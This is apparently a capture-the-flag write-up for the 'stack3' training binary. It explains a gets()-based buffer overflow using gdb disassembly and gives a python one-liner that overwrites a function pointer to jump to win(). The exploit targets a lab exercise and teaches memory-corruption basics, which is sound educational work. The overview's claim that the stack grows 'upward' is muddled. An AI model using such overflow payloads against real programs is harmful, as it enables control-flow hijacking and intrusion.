# Stack 3
## Overview
    1. We need to redirect the execution flow to execute the uncalled 
       function win().
    2. The esp(current stack pointer) grows upward when allocating memory 
       and the higher the esp goes, it points to smaller address number.
       Thus, we must first overwrite the buffer[64] and then overwrite the
       fp to the address of win function.
    3. The buffer[64] gets its value through standard I/O.
    
## Process
    $ gdb -q ./stack3
    (gdb) disas main
        Dump of assembler code for function main:
            0x08048438 <+0>:     push   %ebp
            0x08048439 <+1>:     mov    %esp,%ebp
            0x0804843b <+3>:     and    $0xfffffff0,%esp
            0x0804843e <+6>:     sub    $0x60,%esp
            0x08048441 <+9>:     movl   $0x0,0x5c(%esp)
            0x08048449 <+17>:    lea    0x1c(%esp),%eax
            0x0804844d <+21>:    mov    %eax,(%esp)
            0x08048450 <+24>:    call   0x8048330 <gets@plt>
            0x08048455 <+29>:    cmpl   $0x0,0x5c(%esp)
            0x0804845a <+34>:    je     0x8048477 <main+63>
            0x0804845c <+36>:    mov    $0x8048560,%eax
            0x08048461 <+41>:    mov    0x5c(%esp),%edx
            0x08048465 <+45>:    mov    %edx,0x4(%esp)
            0x08048469 <+49>:    mov    %eax,(%esp)
            0x0804846c <+52>:    call   0x8048350 <printf@plt>
            0x08048471 <+57>:    mov    0x5c(%esp),%eax
            0x08048475 <+61>:    call   *%eax
            0x08048477 <+63>:    leave
            0x08048478 <+64>:    ret
        End of assembler dump.
    (gdb) disas win
        Dump of assembler code for function win:
            0x08048424 <+0>:     push   %ebp
            0x08048425 <+1>:     mov    %esp,%ebp
            0x08048427 <+3>:     sub    $0x18,%esp
            0x0804842a <+6>:     movl   $0x8048540,(%esp)
            0x08048431 <+13>:    call   0x8048360 <puts@plt>
            0x08048436 <+18>:    leave
            0x08048437 <+19>:    ret
        End of assembler dump.
## Method
    It's showed that the address of win function is at 0x08048424.
    We must input a string which is longer than buffer size (64 bytes) 
    to overwrite buffer[64] and modify the value of fp to 0x08048424.
    
    -> Use 64 As + little endian of 0x08048424 (\x24\x84\x04\x08).
## Answer
    $ python -c "print 'A'*64+'\x24\x84\x04\x08'" | ./stack3
    calling function pointer, jumping to 0x08048424
    code flow successfully changed
